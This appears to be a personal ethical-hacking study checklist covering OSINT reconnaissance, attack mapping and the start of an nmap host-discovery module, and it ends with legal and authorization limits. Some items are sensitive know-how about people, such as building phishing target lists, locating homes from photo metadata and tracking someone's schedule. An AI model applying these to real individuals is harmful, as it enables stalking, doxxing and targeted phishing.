- [ ] **Email Header Analysis:** Examine Received: headers for routing path, originating IP, SPF/DKIM validation results. *OSINT angle: spoofed emails fail SPF/DKIM; originating IPs reveal true sender infrastructure (VPN, proxy, geo-location).*
- [ ] **Corporate Email Patterns from LinkedIn:** Extract employee names from LinkedIn, apply discovered email pattern, verify deliverability. *OSINT angle: LinkedIn org charts + email patterns = complete phishing target list with job titles for context-aware pretext.*
- [ ] **Disposable Email Detection:** Identify temporary email services (10minutemail, guerrillamail, etc.) using known domain lists. *OSINT angle: disposable emails indicate evasion behavior or testing accounts — low-value targets for persistent campaigns.*

- [ ] **LinkedIn Employee Enumeration:** Search by company name to build employee roster. Export names, titles, departments. *OSINT angle: org chart reconstruction identifies decision-makers, IT admins, help desk staff (social engineering targets).*
- [ ] **LinkedIn Tech Stack Discovery:** Job postings reveal technologies in use ("experience with AWS, Kubernetes, Splunk required"). *OSINT angle: technology fingerprinting without touching target network — job posts leak exact versions and configurations.*
- [ ] **LinkedIn Connection Analysis:** Map employee relationships, identify external vendors/partners through connections. *OSINT angle: supply chain reconnaissance — third-party vendors with privileged access become attack vectors.*
- [ ] **LinkedIn Email Pattern Inference:** Profiles often show email addresses directly or in contact info. Once one format is confirmed, apply to all employees. *OSINT angle: one public profile = entire company email list.*
- [ ] **LinkedIn Sales Navigator (Trial):** Advanced filtering (company size, industry, job function, seniority) for precise targeting. *OSINT angle: free trial provides enterprise search capabilities; cancel before billing.*
- [ ] **Twitter/X Advanced Search Operators:** `from:username` shows tweets from user; `to:username` shows replies; `since:2024-01-01` and `until:2024-12-31` time-bound searches. Combine: `from:ceo until:2024-01-01` for historical statements. *OSINT angle: recover deleted content from third-party archives; track sentiment changes over time.*
- [ ] **Twitter/X TweetDeck Monitoring:** Real-time monitoring of keywords, hashtags, accounts. Column-based interface for simultaneous feeds. *OSINT angle: detect brand mentions, security incident discussions, employee complaints in real-time.*
- [ ] **Twitter/X Deleted Tweet Archives:** Wayback Machine often captures deleted tweets. Third-party services (Politwoops for politicians) archive deletions. *OSINT angle: deleted tweets often reveal what target wants hidden (PR disasters, compromising statements).*
- [ ] **Twitter/X API Automation:** Rate-limited but powerful for bulk collection. Academic/research access requires approval. *OSINT angle: automate monitoring, historical data collection, network graph analysis.*
- [ ] **Twitter/X Geolocation:** Tweets with location enabled reveal movement patterns. Cross-reference with timestamp for timezone confirmation. *OSINT angle: physical security assessment — identify home location, work location, frequent travel destinations.*
- [ ] **Facebook/Instagram Graph Search:** Limited post-2019 but still useful for photos, check-ins, tagged locations. *OSINT angle: privacy settings misconfiguration exposes photos tagged by others even when profile is private.*
- [ ] **Facebook/Instagram Photo EXIF Extraction:** Download original images (not thumbnails) and extract GPS coordinates, camera model, timestamp. *OSINT angle: users forget EXIF metadata exists — vacation photos leak home address from car in driveway.*
- [ ] **Facebook/Instagram Friend/Follower Analysis:** Map social graph to identify close associates, family members, professional relationships. *OSINT angle: social engineering via trusted relationships — friend's compromised account lends credibility.*
- [ ] **Facebook Event Attendance Tracking:** Public events show attendee lists. *OSINT angle: identify target's schedule (conferences, meetups), predict future locations.*
- [ ] **Facebook/Instagram Public Post Timeline:** Analyze posting patterns for activity timezone, interests, political views, family status. *OSINT angle: pretext development requires authentic context — post history provides conversation hooks.*
- [ ] **GitHub/GitLab Organization Repositories:** Enumerate all repos under target organization. Public repos expose code, infrastructure-as-code (Terraform/CloudFormation), documentation. *OSINT angle: source code review reveals API endpoints, authentication mechanisms, dependencies with known vulnerabilities.*
- [ ] **GitHub Commit History Secret Scanning:** Use TruffleHog, GitRob, or manual `git log -p` to search commit history for hardcoded credentials, API keys, AWS access keys. *OSINT angle: developers commit secrets, panic, delete them in next commit — history preserves them forever.*
- [ ] **GitHub Issue Trackers & Discussions:** Public issues reveal bugs, feature requests, internal debates. *OSINT angle: security bugs disclosed prematurely in public issues before patches deployed.*
- [ ] **GitHub User Contribution Patterns:** Analyze commit timestamps for timezone, work hours, commit frequency. *OSINT angle: timezone inference for attribution; contribution spikes indicate project phases.*
- [ ] **GitHub Advanced Search:** `filename:config.php user:targetuser` finds specific files; `extension:yaml org:targetorg` finds all YAML files in org. *OSINT angle: surgical queries isolate high-value files (database configs, credential stores, API documentation).*

- [ ] **Sherlock Username Enumeration:** Check username across 300+ social media sites simultaneously. Fast, automated, Python-based. *OSINT angle: one username shared across platforms = full digital footprint from single data point.*
- [ ] **WhatsMyName Username Enumeration:** Similar to Sherlock with different site coverage. Cross-check results between tools for completeness. *OSINT angle: username reuse is the norm — handles rarely change even when person moves platforms.*
- [ ] **Namechk Username/Domain Availability:** Check if username is claimed on major platforms and matching domain names. *OSINT angle: unclaimed matching domains = typosquatting/phishing opportunity.*
- [ ] **Username Pattern Analysis:** Analyze naming conventions (firstname_lastname, firstlast1990, 1337handle). *OSINT angle: patterns reveal generation (birth year suffix), interests (gaming handles), or professional vs personal use.*
- [ ] **Cross-Platform Correlation:** Same username on GitHub, Twitter, Reddit = high confidence same person. Verify with overlapping biographical details. *OSINT angle: consolidate fragmented digital presence into unified profile.*

- [ ] **EXIF GPS Coordinates Extraction:** Photos contain embedded GPS coordinates showing exact capture location. Extract with ExifTool or Jeffrey's Image Metadata Viewer. *OSINT angle: vacation photos reveal home address (car in driveway); work photos reveal office location.*
- [ ] **EXIF Camera Make/Model:** Identify device used (iPhone 14 Pro, Canon EOS 5D). *OSINT angle: device fingerprinting across photos confirms photographer identity; high-end cameras suggest professional photographer or serious hobbyist.*
- [ ] **EXIF Timestamp Analysis:** Original capture time vs modification time reveals editing. Timezone in timestamp confirms geographic location. *OSINT angle: timestamp + GPS = full spatiotemporal context; edited timestamps indicate manipulation.*
- [ ] **EXIF Software Metadata:** Records editing software used (Photoshop, GIMP, Snapseed). *OSINT angle: software choice indicates technical proficiency; specific versions have known vulnerabilities.*
- [ ] **EXIF Author/Creator Information:** Some cameras/phones embed owner name in metadata. *OSINT angle: photographer attribution from metadata alone — bypasses account linkage.*
- [ ] **PDF Metadata Extraction:** Author, creation date, modification date, software used, internal file paths leak in PDF properties. *OSINT angle: internal paths reveal username (C:\\Users\\john.smith\\Documents\\); software versions targeted for exploits.*
- [ ] **Microsoft Office Metadata:** Author, company name, revision history, hidden comments/track changes remain in documents. *OSINT angle: company name in metadata confirms attribution; revision history shows document evolution and multiple authors.*
- [ ] **Metadata Scraping Tools:** Use exiftool (universal), pdfinfo (PDF-specific), FOCA (bulk document analysis) for batch processing. *OSINT angle: bulk analysis of hundreds of PDFs reveals organizational patterns (all docs from same internal template with company metadata).*
- [ ] **Corporate Intelligence from Metadata:** Aggregate metadata from all public documents to build employee roster, software inventory, internal network paths. *OSINT angle: metadata is forgotten data — technical users overlook automated embedding by creation tools.*

- [ ] **Google Images Reverse Search:** Upload image or paste URL to find visually similar images and source pages. *OSINT angle: identify original source of profile pictures, verify image authenticity, find higher-resolution versions.*
- [ ] **TinEye Reverse Image Search:** Specializes in finding oldest indexed version of image. *OSINT angle: trace image provenance — original upload location often reveals true source before image was reposted.*
- [ ] **Yandex Images Reverse Search:** Superior facial recognition compared to Google (fewer privacy restrictions). *OSINT angle: identify individuals from photos when Google filters face matches.*
- [ ] **Bing Visual Search:** Microsoft's reverse image search with different index coverage than Google. *OSINT angle: cross-platform searching increases hit probability for obscure images.*
- [ ] **Google Earth Pro Landmark Matching:** Match visible landmarks (buildings, mountains, bridges) to satellite imagery. *OSINT angle: geolocate photos without EXIF data — architectural features, street furniture, signage provide clues.*
- [ ] **Shadow Analysis for Time-of-Day:** Shadow length and direction indicate sun position. Cross-reference with date to estimate capture time. *OSINT angle: verify claimed photo timestamps — shadows don't lie about solar geometry.*
- [ ] **Geolocation from Street Signs & License Plates:** Street names, highway signs, vehicle registrations narrow geographic region. *OSINT angle: license plate formats are jurisdiction-specific; street signs show language and naming conventions.*
- [ ] **Geolocation from Architecture & Vegetation:** Building styles, construction materials, plant species indicate climate and region. *OSINT angle: architectural vernacular is regionally distinct — Soviet-era housing, American suburbs, tropical construction methods.*
- [ ] **GeoSpy.ai & PeakVisor:** AI-powered geolocation from images. PeakVisor identifies mountains in photos by silhouette. *OSINT angle: automates manual landmark matching; reduces geolocation time from hours to minutes.*

- [ ] **Google Maps Street View & 3D View:** Explore ground-level imagery and 3D building models. Historical Street View shows changes over time. *OSINT angle: physical security assessment without site visit — building entry points, security cameras, access controls visible.*
- [ ] **Google Earth Pro Historical Imagery:** Time-slider shows satellite imagery changes over years. *OSINT angle: construction timeline analysis, land use changes, infrastructure development tracking.*
- [ ] **Satellite Imagery (Sentinel Hub, Planet Labs):** Commercial high-resolution imagery with frequent updates. *OSINT angle: free Sentinel data for EU Copernicus program; Planet Labs provides near-daily revisit rates for change detection.*
- [ ] **IP Geolocation (ipinfo.io, MaxMind GeoIP):** Resolve IP addresses to approximate geographic location (city/region level accuracy). *OSINT angle: IP geolocation alone is insufficient for attribution but narrows investigation scope; VPN/proxy detection important.*
- [ ] **Wireless Network Geolocation (WiGLE):** Database of WiFi access point locations mapped by BSSID. *OSINT angle: photos containing visible WiFi networks (SSID in screenshot) geolocated via WiGLE database lookup.*
- [ ] **Cell Tower Triangulation:** Identify cell towers in photos or from metadata; tower locations narrow geographic area. *OSINT angle: tower ID from device diagnostics provides precise location when GPS unavailable.*
- [ ] **Time Zone Analysis from Activity Patterns:** Posting times, email send times, commit timestamps reveal active hours. Convert to local time for timezone inference. *OSINT angle: consistent 9am-5pm activity in UTC+3 suggests Eastern Europe/Middle East; attribution + working hours correlation.*

- [ ] **Pipl, Spokeo, BeenVerified (US-focused):** Aggregate public records, social media, contact information. Subscription-based. *OSINT angle: commercial aggregators consolidate scattered data sources; one query returns addresses, phone numbers, relatives, associates.*
- [ ] **TrueCaller Reverse Phone Lookup:** Crowdsourced caller ID database. Identifies phone number owners globally. *OSINT angle: phone number → name + location; spam/scam number identification.*
- [ ] **Whitepages & AnyWho:** US phone directories and reverse lookup. *OSINT angle: legacy but still functional for landlines and published numbers.*
- [ ] **Public Records Databases:** Court records (PACER for US federal courts), property records, business licenses, professional licenses. *OSINT angle: legal history reveals judgments, liens, bankruptcies; property ownership confirms residence.*
- [ ] **Voter Registration Records (US):** Some states publish voter files including name, address, party affiliation, voting history. *OSINT angle: confirms current address, political affiliations for pretext development.*
- [ ] **Property & Real Estate Records:** County assessor databases show property ownership, sale price, tax assessments. *OSINT angle: wealth estimation from property values; identify all properties owned by individual.*
- [ ] **Court Documents & Legal Records:** PACER (federal), state court systems, RECAP archive (free PACER mirror). *OSINT angle: lawsuit discovery reveals business disputes, divorce proceedings, criminal history — unredacted documents contain sensitive details.*

- [ ] **Corporate Filings (SEC EDGAR):** All US public companies file quarterly/annual reports (10-Q, 10-K), insider trading disclosures (Form 4), merger documents. *OSINT angle: financial health assessment, executive compensation, risk factors section reveals security/cybersecurity concerns.*
- [ ] **Business Registration Records:** Secretary of State databases show corporate officers, registered agents, business addresses. *OSINT angle: shell company detection, ownership chains, related entities through shared officers.*
- [ ] **Patent Databases:** USPTO (US), Google Patents, Espacenet (Europe) index patent applications showing R&D focus, technology roadmap, inventor names. *OSINT angle: future product intelligence from patent filings; inventor names → LinkedIn profiles → technology stack.*
- [ ] **Trademark Databases:** Trademark filings reveal branding strategy, product launches, geographic expansion plans. *OSINT angle: unannounced products visible in trademark applications before public launch.*
- [ ] **BBB Complaints:** Better Business Bureau tracks customer complaints against businesses. *OSINT angle: patterns of unresolved complaints indicate business practices, customer service failures, potential legal exposure.*
- [ ] **Glassdoor Company Reviews:** Current/former employee reviews reveal internal culture, management issues, layoff rumors, technology problems. *OSINT angle: insider perspective without insider access — disgruntled employees leak sensitive operational details in reviews.*
- [ ] **Financial Reports & Investor Presentations:** Quarterly earnings calls, investor slide decks, roadshow presentations. *OSINT angle: future strategy, technology investments, security incident disclosures (material events require reporting).*
- [ ] **Supply Chain & Vendor Relationships:** Job postings, press releases, LinkedIn connections reveal technology vendors and service providers. *OSINT angle: third-party attack surface mapping — compromising vendor with access = lateral entry into target.*

- [ ] **Blockchain Explorer — Blockchain.info (Bitcoin):** Track Bitcoin transactions, wallet balances, transaction graphs. All Bitcoin transactions are public and permanent. *OSINT angle: ransomware payments, darknet market transactions, money laundering chains fully visible on blockchain.*
- [ ] **Blockchain Explorer — Etherscan (Ethereum):** Track Ethereum transactions, smart contract interactions, token transfers (ERC-20, ERC-721 NFTs). *OSINT angle: ICO investments, DeFi activity, NFT purchases reveal financial behavior and wallet associations.*
- [ ] **Blockchain Explorer — Blockchair (Multi-Chain):** Supports Bitcoin, Ethereum, and 15+ other blockchains. Unified interface for cross-chain analysis. *OSINT angle: follow funds across chains when adversaries bridge assets to evade tracking.*
- [ ] **Blockchain Explorer — BSCScan (Binance Smart Chain):** Track BSC transactions and BEP-20 tokens. *OSINT angle: crypto scams often deploy on BSC due to low fees; rugpull analysis requires BSC monitoring.*
- [ ] **Wallet Clustering — Common Ownership Heuristics:** Multiple addresses controlled by same wallet show common-input-ownership (transactions spending from multiple addresses likely controlled by one entity). *OSINT angle: cluster addresses to identify total holdings beyond single address balance.*
- [ ] **Wallet Clustering — Change Address Identification:** Change addresses receive leftover funds from transactions. Pattern analysis reveals wallet structure. *OSINT angle: tracking change addresses follows money even when primary address changes.*
- [ ] **Wallet Clustering — Dust Attack Identification:** Tiny amounts sent to many addresses to de-anonymize wallets through tracking consolidation. *OSINT angle: dust attacks are active deanonymization attempts; recognize pattern to assess adversary sophistication.*
- [ ] **Transaction Graph Analysis — Follow the Money:** Trace input → output chains across multiple hops. Visualize flow with graph tools. *OSINT angle: ransomware payment → exchange deposit = cashing out point; subpoena exchange for KYC data.*
- [ ] **Transaction Graph Analysis — Mixer/Tumbler Detection:** CoinJoin, Wasabi Wallet, Tornado Cash obfuscate transaction trails. Recognize mixing patterns. *OSINT angle: mixer use indicates intentional anonymization; complicates but doesn't eliminate tracking.*
- [ ] **Transaction Graph Analysis — Exchange Deposit Addresses:** Known exchange wallets (Coinbase, Binance, Kraken hot wallets) are identifiable. Funds sent to exchanges = conversion to fiat. *OSINT angle: exchange deposits are cash-out points; exchanges have KYC data tying wallets to real identities.*
- [ ] **Cryptocurrency Forensics Tools — Chainalysis (Commercial):** Law enforcement-grade blockchain analytics. Wallet risk scoring, exchange attribution, mixing detection. *OSINT angle: industry standard for serious investigations; expensive but comprehensive.*
- [ ] **Cryptocurrency Forensics Tools — Elliptic (Commercial):** Similar to Chainalysis; focuses on compliance and sanctions screening. *OSINT angle: tracks sanctioned addresses (OFAC lists), darknet markets, ransomware operators.*
- [ ] **Cryptocurrency Forensics Tools — CipherTrace (Commercial):** Specializes in cryptocurrency anti-money laundering (AML) and threat intelligence. *OSINT angle: integrates with law enforcement databases; attribution confidence scoring.*
- [ ] **Cryptocurrency Forensics Tools — Free Alternatives:** BlockSci (academic research tool), GraphSense (open-source analytics). *OSINT angle: limited compared to commercial tools but viable for basic analysis and learning.*

- [ ] **Personal Website/Blog Discovery:** Google `"firstname lastname" blog` or `site:medium.com "firstname lastname"`. Wayback Machine recovers deleted sites. *OSINT angle: personal blogs reveal opinions, technical expertise, project history — unfiltered compared to professional profiles.*
- [ ] **Forum & Community Participation:** Search username on Reddit, HackerNews, Stack Overflow, niche forums. *OSINT angle: technical questions reveal skill level, technology stack in use, problems currently facing.*
- [ ] **Online Marketplace Activity:** eBay, Etsy, Fiverr profiles show selling history, buyer feedback, geographic hints from shipping. *OSINT angle: side income sources, hobbies, physical location inference from "ships from" region.*
- [ ] **Code Repositories:** GitHub, GitLab, Bitbucket, SourceForge profiles beyond org accounts. Personal projects reveal true skill vs resume claims. *OSINT angle: commit history shows active languages, frameworks, collaboration patterns.*
- [ ] **Question/Answer Sites:** Stack Overflow reputation, questions asked, answers given. Quora, Reddit technical subs. *OSINT angle: technical questions reveal current projects and knowledge gaps; expertise level visible from answer quality.*
- [ ] **Professional Portfolios:** Behance (design), Dribbble (UI/UX), ArtStation (3D/game art). *OSINT angle: creative professionals expose client lists, project types, skillset through portfolio work.*

- [ ] **Mention Monitoring (Google Alerts, Talkwalker Alerts):** Email alerts when brand/person name appears in new web content. *OSINT angle: real-time notification of news mentions, data breaches, public discussions.*
- [ ] **Social Listening (Hootsuite, Brand24):** Monitor social media conversations at scale. Sentiment analysis, influencer identification. *OSINT angle: detect reputation threats, customer complaints, competitor intelligence.*
- [ ] **Review Monitoring (Google Reviews, Yelp, Trustpilot):** Track customer sentiment, service quality complaints, response patterns. *OSINT angle: review patterns reveal operational issues; negative review spikes indicate problems.*
- [ ] **Media Monitoring (Google News, Feedly):** RSS aggregation for press mentions, industry news. *OSINT angle: automated news tracking ensures comprehensive coverage without manual searching.*
- [ ] **Dark Web Monitoring for Brand Mentions:** Monitor paste sites (Pastebin, Ghostbin), darknet forums for credential dumps, leaked data. *OSINT angle: early breach detection before public disclosure; stolen data monetization on underground markets.*

- [ ] **Adversary TTPs (Tactics, Techniques, Procedures):** Identify attack patterns, tool preferences, operational security practices. *OSINT angle: TTP fingerprinting enables actor attribution even when infrastructure changes.*
- [ ] **Malware Signature Analysis:** Hash values, code reuse, compiler artifacts, packer signatures link malware families to actors. *OSINT angle: shared code = shared authorship or tool reuse; VirusTotal intelligence provides malware lineage.*
- [ ] **Infrastructure Overlap:** Shared IPs, domain registrations, SSL certificates, hosting providers across campaigns. *OSINT angle: infrastructure reuse is operational security failure — pivot from one campaign to historical/future campaigns.*
- [ ] **Language Analysis:** Native language indicators in code comments, error messages, ransom notes. Linguistic patterns (grammar, idioms) suggest origin. *OSINT angle: machine translation has distinct patterns; native fluency vs translated text distinguishable.*
- [ ] **Time Zone Analysis:** Activity timestamps (forum posts, malware compilation times, C2 beacon patterns) cluster around working hours. *OSINT angle: consistent UTC+8 activity 9am-5pm local = Asia-Pacific; irregular patterns suggest VPN/proxy or distributed team.*
- [ ] **Motivation Assessment:** Financial (ransomware, banking trojans), espionage (APT, data exfiltration), hacktivism (website defacement, DDoS), destructive (wipers). *OSINT angle: motivation predicts target selection and attack persistence.*
- [ ] **MITRE ATT&CK Group Profiles:** Documented APT groups with known TTPs, tools, targets, geopolitical context. *OSINT angle: standardized threat actor knowledge base — if observed TTPs match ATT&CK group, provisional attribution with confidence level.*

- [ ] **Corroboration (Multiple Independent Sources):** Never rely on single source. Require 2+ independent confirmations for high-confidence assessments. *OSINT lesson: circular reporting (multiple outlets citing same original source) creates illusion of corroboration.*
- [ ] **Source Credibility Assessment:** Evaluate author expertise, publication reputation, citations/sources provided, conflicts of interest. *OSINT angle: anonymous forum posts < verified journalist < official statement in terms of reliability.*
- [ ] **Bias Detection:** Recognize political, commercial, ideological bias in sources. Cross-reference with opposing viewpoints. *OSINT lesson: all sources have bias — question is degree and direction, not binary presence/absence.*
- [ ] **Date Verification (Staleness Check):** Confirm information currency — technology changes rapidly; 2019 blog post may be obsolete. *OSINT angle: old intelligence is often wrong intelligence; timestamp every data point.*
- [ ] **Disinformation & Fake News Detection:** Reverse image search to detect manipulated images. Check claims against fact-checkers. Verify domain legitimacy (typosquatting). *OSINT lesson: state actors and scammers actively plant false information; verify before incorporating into intelligence products.*
- [ ] **Fact-Checking Resources:** Snopes, FactCheck.org, Bellingcat investigation methodology. *OSINT angle: professional fact-checkers document verification methodology — learn their techniques.*

- [ ] **theHarvester:** Command-line tool for email, subdomain, and host enumeration from public sources (Google, Bing, Shodan, etc.). *OSINT angle: automates manual search engine reconnaissance; consolidated output for quick target profiling.*
- [ ] **Photon:** Web crawler with OSINT extraction capabilities (emails, social media accounts, files, subdomains). Python-based, fast, multithreaded. *OSINT angle: single URL input = complete website intelligence extraction.*
- [ ] **Recon-ng:** Modular OSINT framework similar to Metasploit structure. Marketplace of modules for different intelligence sources. *OSINT angle: pipeline automation — chain modules for multi-stage collection (domain → subdomains → IP ranges → ports).*
- [ ] **SpiderFoot:** Automated OSINT collection with web GUI. 200+ modules, correlation engine, visualization. *OSINT angle: point-and-click OSINT for non-technical users; automated correlation identifies relationships.*
- [ ] **Maltego Entity Relationship Graphing:** Visual link analysis showing connections between entities (people, companies, domains, IPs). *OSINT angle: relationship visualization reveals non-obvious connections missed in tabular data.*
- [ ] **Maltego Transform Execution:** Transforms query data sources and return related entities. Chained transforms build intelligence graphs. *OSINT angle: one email address → associated domains → WHOIS registrants → other domains by same registrant (pivot chain).*
- [ ] **Maltego Link Analysis & Visualization:** Graph layout algorithms highlight clusters, central nodes, isolated entities. *OSINT angle: visual pattern recognition faster than reading lists — infrastructure clusters immediately visible.*
- [ ] **Maltego Custom Transforms:** Write Python transforms for proprietary data sources or custom logic. *OSINT angle: integrate internal threat intelligence feeds into Maltego for unified analysis.*
- [ ] **Shodan API:** Programmatic access to Shodan's internet-wide scan data. Search for devices, services, vulnerabilities. Rate-limited (free tier) or unlimited (paid). *OSINT angle: automated monitoring for newly exposed assets; alert on specific service detection.*
- [ ] **Censys API:** Similar to Shodan; focuses on certificate transparency and internet-wide ZMap scans. Academic access available. *OSINT angle: certificate-based subdomain enumeration; historical SSL data for infrastructure pivots.*
- [ ] **VirusTotal API:** Query file hashes, URLs, domains, IPs for malware analysis and reputation data. *OSINT angle: passive DNS records, SSL certificates, communicating files — infrastructure relationships without active scanning.*
- [ ] **Hunter.io API:** Programmatic email discovery and verification. Bulk processing for large employee lists. *OSINT angle: generate phishing target lists from LinkedIn scrapes; verify deliverability before campaign launch.*
- [ ] **Clearbit API:** Business intelligence API (company data, employee data, logo/brand info from domain/email). *OSINT angle: enrich contact data with job titles, company size, technologies used.*
- [ ] **Twitter API & LinkedIn Unofficial APIs:** Twitter API v2 for tweet collection, user timelines, search. LinkedIn has no official API for scraping; unofficial tools exist (ethical/legal gray area). *OSINT angle: bulk collection for trend analysis, network graphing, historical timeline reconstruction.*
- [ ] **Web Scraping with BeautifulSoup/Scrapy:** Parse HTML to extract structured data from websites without APIs. *OSINT angle: any website with public data becomes data source — job boards, forums, directories, public records.*
- [ ] **API Automation with Requests/HTTPX:** Python libraries for HTTP requests. Authenticate, paginate, rate-limit handling. *OSINT angle: automate manual browser workflows; scale from manual OSINT to continuous monitoring.*
- [ ] **Data Enrichment Pipelines:** Chain tools/APIs to progressively enrich data (email → name + company + title + location + social profiles). *OSINT angle: raw intelligence (email list) becomes actionable intelligence (contextual profiles for spear-phishing).*
- [ ] **Alert Systems for Continuous Monitoring:** Webhook notifications, Slack/Discord bots, email alerts when new intelligence matches criteria. *OSINT angle: shift from periodic manual reconnaissance to continuous threat intelligence; detect new assets, breaches, mentions in real-time.*

- [ ] **Public vs Private Information Distinction:** Public = anyone can access without authentication (company websites, government records, social media public posts). Private = requires authentication or is explicitly restricted (direct messages, private profiles, paid databases without authorization). *OSINT lesson: accessing private information without authorization crosses from OSINT to hacking; legality depends on method, not outcome.*
- [ ] **Terms of Service (TOS) Compliance:** Many websites prohibit scraping, automated access, commercial use of data in TOS. Violation = contract breach; enforcement varies. *OSINT angle: TOS violations are civil matters (lawsuits) not criminal; risk assessment required for aggressive collection.*
- [ ] **GDPR (General Data Protection Regulation):** EU regulation governing personal data processing. OSINT on EU persons may trigger GDPR obligations (lawful basis, data minimization, subject access rights). *OSINT lesson: collection is legal, but storage/processing/sharing requires legal basis; consent, legitimate interest, or legal obligation.*
- [ ] **CCPA (California Consumer Privacy Act):** California law granting privacy rights (right to know, right to delete, right to opt-out). Businesses collecting data on CA residents must comply. *OSINT angle: CCPA doesn't prohibit OSINT but creates obligations for businesses storing/selling that data.*
- [ ] **Harassment & Stalking Laws:** OSINT for legitimate security purposes is legal; using OSINT to stalk, harass, threaten, or dox individuals is illegal in most jurisdictions. *OSINT lesson: intent matters — same techniques legal for threat intel, illegal for personal vendettas.*
- [ ] **Computer Fraud & Abuse Act (CFAA) — US:** Prohibits unauthorized access to computers and exceeding authorized access. OSINT itself doesn't trigger CFAA, but bypassing authentication, brute-forcing credentials, or exploiting vulnerabilities does. *OSINT lesson: CFAA criminalizes access method, not information gathering; stay in public space.*
- [ ] **Authorized vs Unauthorized Access:** Authorization must be explicit and current. "The site is publicly accessible" ≠ "I am authorized to scrape it." TOS violations can become CFAA violations (Ninth Circuit precedent). *OSINT angle: conservative interpretation — if you're unsure whether action is authorized, it probably isn't.*
- [ ] **Responsible Disclosure of Findings:** If OSINT reveals security vulnerability (exposed database, leaked credentials, misconfigured S3 bucket), report to organization privately before public disclosure. Follow coordinated vulnerability disclosure (CVD) process. *OSINT lesson: finders are not legally obligated to report, but public disclosure without notification can trigger legal liability if damages occur.*
- [ ] **Client Authorization for OSINT Activities:** Penetration testing engagements require written authorization for scope, methods, targets. OSINT on third parties (vendors, partners, competitors) may fall outside scope. *OSINT lesson: scope document explicitly includes or excludes OSINT; assume exclusion if ambiguous. Unauthorized collection of competitor intelligence can trigger espionage claims.*

---

### Topic 7: Satellite & Geospatial Intelligence (Optional — Skip unless physical pentest is in scope) — 🧠🔬 Mixed
[[Topic-7_Satellite-and-Geospatial-Intelligence|📁]]

> [!WARNING]
> **OPTIONAL — Skip in standard engagements.** This stage covers passive OSINT using publicly available satellite imagery (Google Earth Pro, Sentinel Hub) and geospatial data for physical site reconnaissance. It is only relevant if I am conducting an authorized physical penetration test where facility layout matters.
> For standard corporate network/web pentesting and Red Team engagements, skip this stage entirely and proceed to **Stage 8: Strategy & Attack Mapping**. Do not schedule dedicated study time here.

- [ ] _[Optional]_ For authorized physical pentest scopes only: Use **Google Earth Pro, Sentinel Hub, ipinfo.io, bgp.he.net** to map physical facility layout, data center locations, and IP infrastructure before an on-site engagement.

---

### Topic 8: Strategy & Attack Mapping — 🧠 Conceptual
[[Topic-8_Strategy-and-Attack-Mapping|📁]]

> [!TIP]
> **Goal:** Convert raw data into an execution plan.

> [!NOTE]
> ⏱️ **Time Bracket: 1–2 days** — Day 1: Security architecture classification (is the target Zero Trust with MFA enforcement, or flat network with VPN access?), framework alignment (map all findings to MITRE ATT&CK Tactic/Technique IDs, annotate the Cyber Kill Chain phase each finding supports). Day 2: Attack vector prioritization (rank entry vectors: SQLi vs MITM vs credential brute force vs exposed service — pick the highest-probability, lowest-noise path), finalize and write the attack plan. Deliverable: produce a 1-page attack plan from your Module 08 recon report with ranked entry vectors and a MITRE ATT&CK mapping.

- [ ] **Security Architecture Classification:** Determine if they are utilizing **Zero Trust** or standard **MFA & 2FA**.

- [ ] **Framework Alignment:** Map my findings against the **Cyber Kill Chain, Diamond Model, or MITRE ATT&CK**.

- [ ] **Vulnerability Finalization:** Decide the entry vector based on recon: **SQL Injection, MITM, or Brute Force**.

---

### Lab Progression (Module 08: Footprinting & Reconnaissance)

| Level | Task | Deliverable |
| ----- | ----------------------------------------------------------------------- | --------------------------------------------------------------- |
| 1 | Perform passive recon on a bug bounty target using only OSINT tools | Reconnaissance report (domains, subdomains, emails, tech stack) |
| 2 | Use Google Dorks to find exposed files on a permitted target | Dork queries + findings document |
| 3 | Enumerate subdomains using 3+ tools (Sublist3r, Amass, crt.sh) | Combined subdomain list with deduplication |
| 4 | Map a target's full DNS infrastructure (MX, NS, TXT, CNAME) | DNS map diagram |
| 5 | Perform active recon on a home lab target (traceroute, banner grabbing) | Active recon report |

> [!IMPORTANT]
> **Move-On Gate:** I can produce a complete reconnaissance report on an unfamiliar target using both passive and active techniques, identify the technology stack, and prioritize attack surface areas.

---

---

## Module 09: Scanning
[[Module-09_Scanning|📁]]

> [!NOTE]
> **📚 Recommended Books for This Module**
> - 🔴 `Red Team Field Manual v3` — ⚡ Keep open during all scanning labs
> - 🟡 `Ethical Hacking A Hands-on Introduction to Breaking In` — Scanning & fingerprinting chapters — hands-on Nmap and service enumeration
> - 🟡 `The Power of Scapy V2` — Full (short reference) — custom packet crafting for advanced scanning
> - 🟡 `Wireshark Cheat Sheet` — Keep open during all packet capture analysis labs
> - 🟢 `Hacking and Network Defense` — Network scanning chapter — how scan traffic appears in defender logs

> [!TIP]
> ⏱️ **Module 09 Total Time Budget: 1.5 weeks**
> Topic 1 (host discovery): 1–2 days | Topic 2 (port/service enum): 2–3 days | Topic 3 (defense assessment): 1–2 days | Topic 4 (vuln mapping): 1–2 days | Topic 5 (stealth/evasion): 1–2 days | Topic 6 (advanced): 1 day | Labs: 2–3 days.
> Nmap is the single most important tool in this entire curriculum. Learn every flag. Don’t just run `-sV` blindly — understand what packet is sent, what response is expected, and why each scan type has different stealth/detection characteristics. Every scan you run in Modules 10–13 depends on this.

### Topic 1: Host Discovery & Network Topology (The "Roll Call") — 🔬 Practical
[[Topic-1_Host-Discovery-and-Ping-Sweeps|📁]]

> [!TIP]
> **Goal:** Identify live assets without wasting time on dead IPs or triggering ICMP alarms.

> [!NOTE]
> ⏱️ **Time Bracket: 1–2 days** — Day 1: ARP discovery (`arp-scan`, `nmap -PR` — bypasses host firewalls that block ICMP), ICMP/TCP/UDP sweeps (`nmap -PE/-PS80/-PU53` — know which probe type each flag sends and why), passive traffic capture (Wireshark broadcast traffic — find active hosts without sending a single packet). Day 2: Network pathing (traceroute/hping3 — map perimeter vs DMZ vs internal segments by hop TTL analysis), IPv6 NDP sweeps, and reconcile results from all 3 discovery methods. Deliverable: discover all live hosts on a /24 lab subnet using 3 different discovery methods and reconcile discrepancies between them.

- [ ] **ARP Discovery:** Use `arp-scan` or `nmap -PR` for local segment discovery to bypass host firewalls that drop ICMP.

- [ ] **ICMP & TCP/UDP Sweeps:** Perform standard `ping` sweeps or use `nmap -PS/-PU` (ports 80, 443, 53) to find external hosts that block standard pings.

- [ ] **Passive Traffic Capture:** Utilize **Wireshark** to capture broadcast traffic, revealing active hosts without sending a single packet.

- [ ] **Network Pathing & Perimeter Analysis:** Deploy `tracert` or `[[hping3]] --traceroute` to map hops and define **Perimeter vs DMZ vs Segmentation** boundaries.

